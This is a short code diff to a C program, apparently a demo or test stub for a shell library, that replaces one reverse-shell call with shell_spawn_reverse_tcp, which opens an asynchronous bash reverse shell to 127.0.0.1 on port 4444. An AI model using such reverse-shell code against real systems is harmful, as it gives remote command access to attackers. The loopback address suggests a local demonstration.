@@ -16,6 +16,7 @@
 \-----------------------------------------------------------------------*/
 
 #include <stdio.h>
+#include <string.h>
 #include "include/stub/shell.h"
 
 void help_menu(){
@@ -24,6 +25,8 @@ void help_menu(){
 
 int main(){
   help_menu();
-  shell_reverse_tcp("127.0.0.1", 4444);
+  shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_TRUE);
+  printf("hello\n");
+  sleep(5);
   return 0;
 }
